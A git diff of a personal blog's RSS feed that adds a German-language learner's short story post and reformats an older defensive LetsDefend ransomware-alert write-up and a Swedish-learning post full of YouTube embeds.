@@ -1,4 +1,35 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Ceso Adventures</title><link>https://ceso.github.io/posts/</link><description>Recent content in Posts on Ceso Adventures</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Fri, 24 Jun 2022 02:43:00 +0000</lastBuildDate><atom:link href="https://ceso.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>SOC145 - Ransomware Detected</title><link>https://ceso.github.io/posts/2022/06/soc145-ransomware-detected/</link><pubDate>Fri, 24 Jun 2022 02:43:00 +0000</pubDate><guid>https://ceso.github.io/posts/2022/06/soc145-ransomware-detected/</guid><description>Quick Summary Well, my lab time for OSWE/OSED courses just came to an end and I&amp;rsquo;m still way to far from being able to take their respective exams (still haven&amp;rsquo;t even reached the challenges, stuck on the material/excersises), so just as a way to take a short rest and a change of air from it, I decided to take a look around if there was anything similar to HTB but for Blue Team stuff (I barely know stuff related to it, besides my tasks as Appsec/DevSecOps whatever you want to call it mehh!</description><content type="html"><![CDATA[
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Ceso Adventures</title><link>https://ceso.github.io/posts/</link><description>Recent content in Posts on Ceso Adventures</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 07 Jun 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://ceso.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Zerdenken</title><link>https://ceso.github.io/posts/2025/06/zerdenken/</link><pubDate>Sat, 07 Jun 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2025/06/zerdenken/</guid><description>&lt;img src="https://ceso.github.io/images/blog/general/zerdenken.png" class="center" style="border-radius: 10x;" />
+&lt;p>Als es April 2022, habe ich einen Post auf Schwedisch geschreiben, weil ich angefangen habe, Schwedisch zu lernen. Ich erinnere mich nicht, wann genau ich aufgehört habe, Schwedisch zu lernen.
+Im Februar 2023 bin ich nach Deutschland umgezogen. Als ich umgezogen bin, habe ich anfangen, um Deutsch zu lernen. Jetzt lerne ich seit ungefähr zwei Jahren Deutsch.&lt;/p>
+&lt;p>Es ist ein bisschen komisch, aber ich habe das Gefühl, dass ich etwas auf Deutsch ausdrucken kann, was ich in meiner Muttersprache (Spanisch) nicht konnte - sogar wenn ich viele Fehler mache.&lt;/p></description><content type="html"><![CDATA[
+    <img src="/images/blog/general/zerdenken.png"  class="center"  style="border-radius: 10x;"  />
+
+
+<p>Als es April 2022, habe ich einen Post auf Schwedisch geschreiben, weil ich angefangen habe, Schwedisch zu lernen. Ich erinnere mich nicht, wann genau ich aufgehört habe, Schwedisch zu lernen.
+Im Februar 2023 bin ich nach Deutschland umgezogen. Als ich umgezogen bin, habe ich anfangen, um Deutsch zu lernen. Jetzt lerne ich seit ungefähr zwei Jahren Deutsch.</p>
+<p>Es ist ein bisschen komisch, aber ich habe das Gefühl, dass ich etwas auf Deutsch ausdrucken kann, was ich in meiner Muttersprache (Spanisch) nicht konnte - sogar wenn ich viele Fehler mache.</p>
+<p>Heute, als ich langewilig war, kam mir eine Idee: Sollte ich etwas auf Deutsch schreiben? Und ich habe mir selbst antworte - JA, warum nicht?
+Deswegen, ich habe entscheidet, einige der Texte, die ich heute geschreibt habe, in diesen kurzen Post zu veröffentlichen.
+Bitte, wenn du es liest, hab Gnade mir mir. Vergessen dich nicht, ich habe bloß seit 2 Jahre Deutsch angefangen zu lernen und selbsverständlich, wie bei alles bei mir - ich bin Autodidakt.
+Dieser Post ist besonders für mich. Es ist etwas, das ich später in der Zukunft wieder lesen kann und dann begriffe, wie viel mein Deutsch verbessert hat.</p>
+<p>Ich heiße diese Text: Zerdenken.</p>
+<h1 id="zerdenken">Zerdenken</h1>
+<p>,,Du hast mich halt verändert!&quot; - sagt er</p>
+<p>Schweigen.</p>
+<p>,,HALLOOOOO! Hast du doch mir nicht gehört?&quot;</p>
+<p>Schweigen.</p>
+<p>,,VERDAMMT, was für ein Blödsinn! Antwrort mir doch!&quot;</p>
+<p>Wiederholen, nichts geschah.</p>
+<p>Das Luft war rein, wie das Nordmeer nach einem Sturm.</p>
+<p>Du hast mich ehrlich geändert, es gibt keinen Rückweg mehr.</p>
+<p>Du hast Alles verheert.</p>
+<p>Was könnte ich, um diesen Sehnsucht zu zerchlagen?</p>
+<p>Sie verlangen der Vergangenheit, dafür kann nichts mehr zu tun. Jetzt sie sind wie Scham.</p>
+<p>Dann hat er sich erahne - er musst sich ja halten.</p>
+<p>Als er sich erhellt, hat er aus den Badezimmer laufen und niemals nie davon sich zerdenken.</p>
+]]></content></item><item><title>SOC145 - Ransomware Detected</title><link>https://ceso.github.io/posts/2022/06/soc145-ransomware-detected/</link><pubDate>Fri, 24 Jun 2022 02:43:00 +0000</pubDate><guid>https://ceso.github.io/posts/2022/06/soc145-ransomware-detected/</guid><description>&lt;img src="https://ceso.github.io/images/letsdefend/soc145/ransomware-card.png" class="center" style="border-radius: 8px;" />
+&lt;h2 id="quick-summary">Quick Summary&lt;/h2>
+&lt;p>Well, my lab time for OSWE/OSED courses just came to an end and I&amp;rsquo;m still way to far from being able to take their respective exams (still haven&amp;rsquo;t even reached the challenges, stuck on the material/excersises), so just as a way to take a short rest and a change of air from it, I decided to take a look around if there was anything similar to HTB but for Blue Team stuff (I barely know stuff related to it, besides my tasks as Appsec/DevSecOps whatever you want to call it mehh!), by doing this I ended up finding a web page called &amp;ldquo;Lets Defend&amp;rdquo;, it has some ctf alike games but focused exactly on the Blue Team side together with some Training content, which in a really easy and understandable way explains the 101 of SOC/Incident Response/SIEM, etc, pretty nice to have a quick and overview about that stuff, I liked it.&lt;/p></description><content type="html"><![CDATA[
     <img src="/images/letsdefend/soc145/ransomware-card.png"  class="center"  style="border-radius: 8px;"  />
 
 
@@ -54,8 +85,7 @@
 
 <p>So, we see that this malware what it does is to start deleting shadow copies, but what are shadow copies, well from wikipedia&hellip;</p>
 <blockquote>
-<p>Shadow Copy (also known as Volume Snapshot Service, Volume Shadow Copy Service or VSS) is a technology included in Microsoft Windows that can create backup copies or snapshots of computer files or volumes, even when they are in use.</p>
-</blockquote>
+<p>Shadow Copy (also known as Volume Snapshot Service, Volume Shadow Copy Service or VSS) is a technology included in Microsoft Windows that can create backup copies or snapshots of computer files or volumes, even when they are in use.</p></blockquote>
 <p>So what it&rsquo;s doing is to delete volume snapshots (backups). Moving forward with the investigation we want to see if there&rsquo;s any activity on the logs, which isn&rsquo;t (the Network Connectivity also didn&rsquo;t have anything, but I don&rsquo;t feel like taking a screenshot again):</p>
 
     <img src="/images/letsdefend/soc145/9-investigation-log.png"  class="center"  style="border-radius: 8px;"  />
@@ -96,8 +126,9 @@ Knwon this, we can proceed to close the case:</p>
 Overall I liked the challenge and is something completly different to what I have been doing lately, and I sure learned something new even if it&rsquo;s quite basic is still nice.
 I&rsquo;m sure there might be still something to look for in the investigation, for example discovering how the compromise took place, I will keep reading a bit more about methodologies etc, play a bit more applying them and see if I can find the root cause, if I find it I will edit the post to show how I did it.</p>
 <p>Hope this helps you in some way, until the next post!</p>
-]]></content></item><item><title>Hur jag är lär mig svenska</title><link>https://ceso.github.io/posts/2022/04/hur-jag-%C3%A4r-l%C3%A4r-mig-svenska/</link><pubDate>Sat, 09 Apr 2022 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2022/04/hur-jag-%C3%A4r-l%C3%A4r-mig-svenska/</guid><description>Förneka: Deta blogginlägget har mycket fel, jag vet det, men&amp;hellip;jag vill bara skriva lite om hur jag lär mig svenska, så det är en lite öva för mig, ingenting allvarlig!
-Vad kan säga jag? Jag gillar hur germanska språk ljud, och jag också gillar många metal-band från sverige (och svenska kultur), för det anledning beslutade jag lär mig svenska (i framtiden jag skulle vilja också lär tyska och holländska).</description><content type="html"><![CDATA[
+]]></content></item><item><title>Hur jag är lär mig svenska</title><link>https://ceso.github.io/posts/2022/04/hur-jag-%C3%A4r-l%C3%A4r-mig-svenska/</link><pubDate>Sat, 09 Apr 2022 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2022/04/hur-jag-%C3%A4r-l%C3%A4r-mig-svenska/</guid><description>&lt;img src="https://ceso.github.io/images/blog/general/larsvenska.png" class="center" style="border-radius: 8px;" />
+&lt;p>Förneka: Deta blogginlägget har mycket fel, jag vet det, men&amp;hellip;jag vill bara skriva lite om hur jag lär mig svenska, så det är en lite öva för mig, ingenting allvarlig!&lt;/p>
+&lt;p>Vad kan säga jag? Jag gillar hur germanska språk ljud, och jag också gillar många metal-band från sverige (och svenska kultur), för det anledning beslutade jag lär mig svenska (i framtiden jag skulle vilja också lär tyska och holländska).&lt;/p></description><content type="html"><![CDATA[
     <img src="/images/blog/general/larsvenska.png"  class="center"  style="border-radius: 8px;"  />
 
 
@@ -117,198 +148,166 @@ Faktiskt jag läser på &ldquo;Harry Potter - Och De Vises Sten&rdquo; (jag har 
 <h1 id="youtube-kanaler">Youtube kanaler</h1>
 <h2 id="svensk-youtubers-eller-bara-lär-det">Svensk youtubers (eller bara lär det)</h2>
 <h3 id="say-it-in-swedish">Say It In Swedish</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/ijiaeuKnYRQ" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/ijiaeuKnYRQ?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="fun-swedish">Fun Swedish</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/6IIPA9JeIBo" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/6IIPA9JeIBo?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="the-swedish-linguist">The Swedish Linguist</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/I4L8d_XAhIc" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/I4L8d_XAhIc?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="academia-cervena">Academia Cervena</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/lXp7_Sjgm34" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/lXp7_Sjgm34?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="theswedishlad">TheSwedishLad</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/7CQX3Htj7jE" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/7CQX3Htj7jE?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="christopher-oregan">Christopher O&rsquo;Regan</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/9ByJEuafSYc" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/9ByJEuafSYc?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="uppdrag-mat">Uppdrag: Mat</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/jelwGUv9i_U" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/jelwGUv9i_U?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="markus-aujalay">Markus Aujalay</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/DYSC5HyoQ6c" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/DYSC5HyoQ6c?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="leif-mannenrström">Leif Mannenrström</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/NpVFsgvUonY" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/NpVFsgvUonY?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="days-of-french-n-swedish">Days of French &rsquo;n&rsquo; Swedish</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/InqEZDCaLRs" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/InqEZDCaLRs?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h2 id="svenska-för-alla---a-crash-course-in-swedish">SVENSKA FÖR ALLA - a crash course in Swedish</h2>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/aoEoUWrGxzQ" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/aoEoUWrGxzQ?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h2 id="svensk-youtube-kanaler-till-exempel-nyheter">Svensk youtube kanaler (till exempel: nyheter)</h2>
 <h3 id="svt">SVT</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/FqOCM1iKN_k" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/FqOCM1iKN_k?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="svt-humor">SVT Humor</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/ol_5yMD4Ujw" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/ol_5yMD4Ujw?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="tv4">TV4</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/-Vqw_Iu_swo" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/-Vqw_Iu_swo?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h2 id="tv4-nyheterna">TV4 Nyheterna</h2>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/N7WFU6tK37I" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/N7WFU6tK37I?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="nyhetsmorgon">Nyhetsmorgon</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/7yjua6aeIXo" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/7yjua6aeIXo?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="aftonbladet">Aftonbladet</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/bswXXjOAEcY" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/bswXXjOAEcY?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="8-sidor">8 SIDOR</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/OSRi2ayQEQ4" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/OSRi2ayQEQ4?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="infinitum-no">Infinitum No</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/hVKIarZjag4" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/hVKIarZjag4?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="efter-fem">Efter fem</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/Jo0YgLJ1OuI" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/Jo0YgLJ1OuI?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="nyheter24">Nyheter24</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/7bOO16wmjJ4" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/7bOO16wmjJ4?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="format-historia">FORMAT HISTORIA</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/_Z9z9UbXg6g" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/_Z9z9UbXg6g?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="uppkåkra">Uppkåkra</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/oP24EeFQj3U" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/oP24EeFQj3U?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="gamla-uppsala-museum">Gamla Uppsala museum</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/HmK4dazSD3s" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/HmK4dazSD3s?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="historiska-museet-vid-lunds-universitet">Historiska museet vid Lunds universitet</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/9zR0WNpbfDE" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/9zR0WNpbfDE?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="historiska-museet">Historiska museet</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/-RmuD3oz5C4" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/-RmuD3oz5C4?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="upplandmuseet">UPPLANDMUSEET</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/WwZwQp74OJ8" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/WwZwQp74OJ8?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
 
 <h3 id="statens-maritima-och-transporthistoriska-museer">Statens maritima och transporthistoriska museer</h3>
-
 <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
